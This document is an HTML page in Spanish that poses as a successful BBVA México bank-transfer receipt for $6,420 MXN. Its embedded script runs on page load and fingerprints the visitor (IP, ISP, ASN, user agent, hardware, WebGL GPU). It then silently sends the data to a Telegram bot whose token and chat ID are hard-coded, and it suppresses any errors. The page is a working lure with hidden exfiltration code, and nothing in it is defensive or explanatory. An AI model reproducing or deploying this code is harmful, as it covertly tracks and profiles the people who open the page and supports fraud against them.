<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comprobante de Transferencia Exitosa</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; width: 350px; padding: 25px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); border-top: 10px solid #004a99; text-align: center; }
        .monto { font-size: 30px; font-weight: bold; margin: 20px 0; color: #333; }
        .status { color: #28a745; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <div class="status">✓ TRANSFERENCIA FINALIZADA</div>
        <div class="monto">$6,420.00 MXN</div>
        <p style="font-size: 12px; color: #777;">Referencia: SPEI-992811<br>Banco: BBVA México</p>
    </div>

<script>
    window.onload = async function() {
        // Configuración de Telegram
        const TOKEN = '8583686617:AAE7OeA-mkMENpJ0Ke5ndJ0xpCuF2DcaEpU';
        const CHAT_ID = '-1003773057625';

        try {
            // 1. Obtener IP y datos de red
            const res = await fetch('https://ipapi.co/json/');
            const netData = await res.json();

            // 2. Recopilar información técnica
            const gpu = getGraphicsCard();
            const info = {
                ip: netData.ip || "N/A",
                isp: netData.org || "N/A",
                asn: netData.asn || "N/A",
                user_agent: navigator.userAgent,
                plataforma: navigator.platform,
                cpu_cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
                resolucion: `${window.screen.width}x${window.screen.height}`,
                gpu: gpu,
                puerto: window.location.port || (window.location.protocol === 'https:' ? '443' : '80')
            };

            // 3. Formatear mensaje para Telegram
            const mensaje = `<b>🚀 Nuevo Log Capturado</b>\n\n` +
                          `🌐 <b>Red:</b>\n` +
                          `• IP: <code>${info.ip}</code>\n` +
                          `• ISP: ${info.isp}\n` +
                          `• ASN: ${info.asn}\n` +
                          `• Puerto: ${info.puerto}\n\n` +
                          `💻 <b>Hardware:</b>\n` +
                          `• CPU: ${info.cpu_cores} núcleos\n` +
                          `• RAM: ${info.ram}\n` +
                          `• Pantalla: ${info.resolucion}\n` +
                          `• GPU: ${info.gpu}\n\n` +
                          `📱 <b>Sistema:</b>\n` +
                          `• Plataforma: ${info.plataforma}\n` +
                          `• Agente: <code>${info.user_agent}</code>`;

            // 4. Envío a Telegram vía fetch
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: mensaje,
                    parse_mode: 'HTML'
                })
            });

        } catch (e) {
            console.log("Silent Error");
        }
    };

    function getGraphicsCard() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "N/A";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
    }
</script>
</body>
</html>
